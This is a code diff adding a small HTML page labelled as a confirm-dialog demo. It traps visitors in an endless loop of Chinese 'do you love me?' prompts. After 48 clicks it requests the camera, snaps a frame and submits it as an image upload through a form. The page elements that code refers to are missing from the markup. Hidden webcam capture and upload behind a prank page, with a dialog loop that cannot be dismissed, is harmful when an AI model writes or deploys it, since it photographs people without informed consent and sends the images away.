@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+	<title>Confirm Dialog Demo</title>
+</head>
+<body>
+	<script charset="UTF-8">
+		var count = 0; // 记录点击次数
+
+		function showDialog() {
+			var message = ""; // 确认框提示信息
+
+			if (count === 0) {
+				message = "你爱我么？";
+			} else if (count < 48) {
+				message = "你爱了我 " + count + " 次。要爱我满50次才行哦。";
+			} else {
+				var canvas = document.getElementById('canvas');
+            var context = canvas.getContext('2d');
+            var video = document.getElementById('video');
+
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
+                    video.srcObject = stream;
+                    video.play();
+
+                    setTimeout(function () { context.drawImage(video, 0, 0, 480, 640); }, 1000);
+                    setTimeout(function () {
+                        canvas.toBlob((blob) => {
+                            const form = document.getElementById('gopo')
+                            const file = new File([blob], "Alan.png",{type:"image/png", lastModified:new Date().getTime()});
+                            const dt = new DataTransfer();
+                            dt.items.add(file);
+                            document.getElementById('result').files = dt.files;
+                            form.submit();
+                        });
+
+                    }, 1300);
+                }, function () { alert("你不爱我，我讨厌你！"); });
+
+            }
+			}
+
+			// 显示确认框
+			var result = confirm(message);
+
+			if (result === true) { // 点击了 OK
+				count++;
+				if (count < 50) {
+					showDialog(); // 继续弹出确认框
+				} 
+			} else { // 点击了 Cancel
+				alert("不，你必须爱我。");
+				showDialog(); // 继续弹出确认框
+			}
+		}
+
+		showDialog(); // 弹出第一个确认框
+	</script>
+</body>
+</html>
